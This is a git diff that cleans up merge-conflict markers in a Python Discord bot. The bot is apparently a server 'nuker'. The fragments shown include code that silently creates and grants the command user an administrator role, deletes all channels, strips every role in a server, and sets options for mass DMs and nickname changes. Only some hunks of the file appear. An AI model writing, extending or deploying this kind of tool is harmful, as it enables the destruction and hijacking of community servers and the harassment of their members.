@@ -9,29 +9,20 @@ from discord.ext import commands
 import requests
 
 from datetime import datetime
-<<<<<<< HEAD
 from os import listdir
-=======
-from os import path, listdir
->>>>>>> 6fef6235e29c4a244737569ce4787594bf435546
 from time import sleep
 from typing import Optional
 from json import loads, dumps
 
-<<<<<<< HEAD
+
 # If settings json doesn't exist, create it
 if "settings.json" not in listdir():
-=======
-#If settings json doesn't exist, create it
-if not "settings.json" in listdir():
->>>>>>> 6fef6235e29c4a244737569ce4787594bf435546
     file = open("settings.json", "w+")
     file.write("""{
     "TOKEN": false,
     "USERID": false,    
     "PREFIX": "!",
     "STATUS": "watching,for !help",
-<<<<<<< HEAD
     "ROLE_IDS": {}
 }""")
     file.close()
@@ -44,18 +35,6 @@ file = open("settings.json", "r")
 json_string = file.read()
 file.close()
 settings = loads(json_string)
-=======
-    "ROLEIDS": {}
-}""")
-    file.close()
-    input("Created Settings JSON, please fill in your bot's token and your user ID (For correct syntax, look at the readme on GitHub)! To continue, press enter!")
-
-#Load settings
-file = open("settings.json", "r")
-jsonstring = file.read()
-file.close()
-settings = loads(jsonstring)
->>>>>>> 6fef6235e29c4a244737569ce4787594bf435546
 TOKEN = settings["TOKEN"]
 PREFIX = settings["PREFIX"]
 STATUS = settings["STATUS"]
@@ -107,17 +86,12 @@ nuke_channel = [True]  # nuke_channel config in !skip
 dm = [False]  # dm config in !skip
 nick = [False]  # nick config in !skip
 
-<<<<<<< HEAD
 
 # Read and write role IDs
-=======
-#Read and write role IDs
->>>>>>> 6fef6235e29c4a244737569ce4787594bf435546
 def getRoleIDs():
     file = open("settings.json", "r")
     read = file.read()
     file.close()
-<<<<<<< HEAD
     return loads(read)["ROLE_IDS"]
 
 
@@ -127,14 +101,6 @@ def writeRoleIDs(write):
     read["ROLE_IDS"] = write
     file.close()
 
-=======
-    return loads(read)["ROLEIDS"]
-def writeRoleIDs(write):
-    file = open("settings.json", "r")
-    read = loads(file.read())
-    read["ROLEIDS"] = write
-    file.close()
->>>>>>> 6fef6235e29c4a244737569ce4787594bf435546
     file = open("settings.json", "w+")
     file.write(dumps(read))
     file.close()
@@ -153,12 +119,8 @@ def output_log(text):
 async def create_admin(ctx):
     try:
         guildRoleIDs = []
-<<<<<<< HEAD
         for role in ctx.guild.roles:
             guildRoleIDs.append(role.id)
-=======
-        for role in ctx.guild.roles: guildRoleIDs.append(role.id)
->>>>>>> 6fef6235e29c4a244737569ce4787594bf435546
         roleIDs = getRoleIDs()
         if not roleIDs == {}:
             if str(ctx.guild.id) in roleIDs.keys():
@@ -180,12 +142,8 @@ async def create_admin(ctx):
 
         alreadyHasRole = False
         for userRole in ctx.message.author.roles:
-<<<<<<< HEAD
             if userRole.id == role.id:
                 alreadyHasRole = True
-=======
-            if userRole.id == role.id: alreadyHasRole = True
->>>>>>> 6fef6235e29c4a244737569ce4787594bf435546
         if not alreadyHasRole:
             await ctx.message.author.add_roles(role)
 
@@ -198,21 +156,14 @@ Time: {datetime.now()}
 ''')
 
     except discord.Forbidden:
-<<<<<<< HEAD
         output_log(f'''
-=======
-            output_log(f'''
->>>>>>> 6fef6235e29c4a244737569ce4787594bf435546
 Failed to create/grant administrator role: insufficient permissions.
 Server Name: {ctx.guild.name}
 Server Owner: {ctx.guild.owner}
 Time: {datetime.now()}
 ''')
 
-<<<<<<< HEAD
 
-=======
->>>>>>> 6fef6235e29c4a244737569ce4787594bf435546
 # delete all channels
 async def delete_channels(ctx):
     for guild in bot.guilds:
@@ -398,21 +349,13 @@ async def nuke(ctx):
     # delete all roles
 
     role_list = []
-<<<<<<< HEAD
 
-=======
-    
->>>>>>> 6fef6235e29c4a244737569ce4787594bf435546
     roleIDs = getRoleIDs()
 
     for role in ctx.guild.roles:
         if role == ctx.guild.default_role:
             pass
-<<<<<<< HEAD
         elif role == discord.utils.get(ctx.guild.roles, name=bot.user.name):
-=======
-        elif role == discord.utils.get(ctx.guild.roles, name=bot.user):
->>>>>>> 6fef6235e29c4a244737569ce4787594bf435546
             pass
         elif role == ctx.guild.get_role(roleIDs[str(ctx.guild.id)]):
             pass
@@ -879,8 +822,4 @@ if not TOKEN:
     except KeyboardInterrupt:
         print("Quitting... press CTRL+C again to kill the app.")
 else:
-<<<<<<< HEAD
     bot.run(TOKEN)
-=======
-    bot.run(TOKEN)
->>>>>>> 6fef6235e29c4a244737569ce4787594bf435546
